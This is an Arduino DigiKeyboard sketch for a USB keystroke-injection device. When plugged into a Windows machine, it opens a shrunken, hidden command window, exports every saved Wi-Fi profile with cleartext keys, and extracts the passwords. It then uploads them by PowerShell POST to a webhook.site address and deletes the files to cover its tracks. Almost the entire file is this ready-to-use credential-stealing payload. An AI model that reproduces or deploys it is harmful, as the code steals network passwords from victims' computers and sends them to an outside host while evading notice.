/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  // Open PowerShell
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Set Layout to US
  
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Exploit (Add your code here)
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  //turn on led when program finishes

  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); 

  // Set Layout to DE

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
